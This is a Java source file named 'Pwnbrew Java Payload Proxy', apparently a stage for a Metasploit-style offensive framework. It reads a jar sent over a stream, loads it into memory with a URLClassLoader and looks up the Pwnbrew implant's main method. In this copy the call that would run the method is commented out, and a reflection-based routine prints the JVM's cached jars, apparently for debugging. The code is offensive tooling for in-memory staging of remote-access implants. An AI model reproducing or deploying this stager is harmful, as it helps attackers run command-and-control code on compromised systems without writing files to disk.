import java.io.DataInputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Iterator;
import java.util.jar.JarFile;
import sun.net.www.protocol.jar.JarURLConnection;


/**
 * Pwnbrew Java Payload Proxy
 */
public class Pwnbrew implements Stage {

    @Override
    public void start(DataInputStream in, OutputStream out, String[] passedParameters ) throws Exception {

        int coreLen = in.readInt();
        byte[] core = new byte[coreLen];
        in.readFully(core);
        
        URL coreURL = MemoryBufferURLConnection.createURL(core, "application/jar");  
        Class classJarURLConnection = JarURLConnection.class;              
        
        Field aField = null;
        try {
            aField = classJarURLConnection.getDeclaredField("factory");
        } catch (NoSuchFieldException e) {
        //ignore
        }
        
        URLClassLoader aLoader = new URLClassLoader(new URL[] { coreURL }, getClass().getClassLoader());
        
        Method aMethod = aLoader.loadClass("pwnbrew.Pwnbrew").getMethod("main", new Class[]{ String[].class } );
        //aMethod.invoke(null, new Object[]{ passedParameters });
        printCachedJars();
                
        in.close();
        out.close();
    }
    
    // ========================================================================
    /**
    *    Cleanup jar file factory cache
    */
    private static boolean printCachedJars(){
        
        boolean retVal = false;
        Class classJarURLConnection = JarURLConnection.class;              
        
        Field aField = null;
        try {
            aField = classJarURLConnection.getDeclaredField("factory");
        } catch (NoSuchFieldException e) {
        //ignore
        }
        
        if (aField == null)
            return retVal;
                
        aField.setAccessible(true);
        Object anObj = null;
        try {
            anObj = aField.get(null);
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        if (anObj == null)
            return retVal;
        
        
        Class classJarFileFactory = anObj.getClass();
        HashMap fileCache = null;
        try {
            aField = classJarFileFactory.getDeclaredField("fileCache");
            aField.setAccessible(true);
            anObj = aField.get(null);
            if (anObj instanceof HashMap) {
                fileCache = (HashMap)anObj;
            }
        } catch (NoSuchFieldException e) {
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        HashMap urlCache = null;
        try {
            aField = classJarFileFactory.getDeclaredField("urlCache");
            aField.setAccessible(true);
            anObj = aField.get(null);
            if (anObj instanceof HashMap) {
                urlCache = (HashMap)anObj;
            }
        } catch (NoSuchFieldException e) {
        } catch (IllegalAccessException e) {
        //ignore
        }
        
        if (urlCache != null) {
            
            HashMap urlCacheTmp = (HashMap)urlCache.clone();
            Iterator it = urlCacheTmp.keySet().iterator();
            while (it.hasNext()) {
                anObj = it.next();
                if (!(anObj instanceof JarFile)) {
                    continue;
                }
                
                JarFile aJarFile = (JarFile)anObj;
                System.out.println( "Jar name: " + aJarFile.getName());
                System.out.println( "Jar type: " + anObj.getClass().getSimpleName());
            }
            retVal = true;
            
        } 
        if (fileCache != null) {
            
            // urlCache := null
            HashMap fileCacheTmp = (HashMap)fileCache.clone();
            Iterator it = fileCacheTmp.keySet().iterator();
            while (it.hasNext()) {
                
                Object key = it.next();
                anObj = fileCache.get(key);
                if (!(anObj instanceof JarFile)) {
                    continue;
                }
                JarFile jarFile = (JarFile)anObj;
                System.out.println( "Jar name: " + jarFile.getName());
                System.out.println( "Jar type: " + anObj.getClass().getSimpleName());
            
            }
            retVal = true;
        }
       
        return retVal;
    }
}
